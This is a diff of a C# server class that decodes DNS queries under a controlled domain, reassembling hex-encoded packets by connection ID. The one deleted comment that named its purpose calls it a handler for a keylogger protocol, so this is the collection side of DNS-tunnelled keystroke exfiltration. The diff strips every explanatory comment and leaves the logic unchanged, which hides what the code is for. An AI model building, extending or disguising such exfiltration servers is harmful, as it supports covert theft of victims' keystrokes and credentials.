@@ -3,9 +3,7 @@ using Server.Models;
 
 namespace Server.Logic
 {
-    /// <summary>
-    /// Handle keylogger protocol (a/b packets)
-    /// </summary>
+
     public class ProtocolHandler
     {
         private readonly string _domain;
@@ -17,20 +15,17 @@ namespace Server.Logic
             _domain = domain;
         }
 
-        /// <summary>
-        /// Extract subdomain data from full query
-        /// </summary>
+
         public string GetData(string full)
         {
             string stripped = full.TrimEnd('.');
 
-            // Check if query belongs to our domain
             if (!(stripped == _domain || stripped.EndsWith("." + _domain)))
             {
                 throw new ShortCircuitException();
             }
 
-            // Count dots - must match format: type.x.x.x.domain
+            
             int expectedDots = _domain.Count(c => c == '.') + 4;
             int actualDots = stripped.Count(c => c == '.');
 
@@ -38,17 +33,13 @@ namespace Server.Logic
             {
                 throw new UnrelatedException();
             }
-
-            // Return subdomain part (a.1.1.1 or b.0.5.hexdata)
+            
             return full.Substring(0, IndexOfSecondDot(stripped));
         }
         
-        /// Parse data packet and add to parser
-        /// Format: packetNumber.connectionId.hexData
-
         public (int PacketNumber, int ConnectionId) ParseDataPacket(string data, ClientManager clientManager)
         {
-            // Format validation
+ 
             if (data.Count(c => c == '.') != 2)
             {
                 throw new DNSSyntaxException();
@@ -91,7 +82,6 @@ namespace Server.Logic
             return (packetNumber, connectionId);
         }
         
-        /// Find position of second dot from right
 
         private int IndexOfSecondDot(string str)
         {
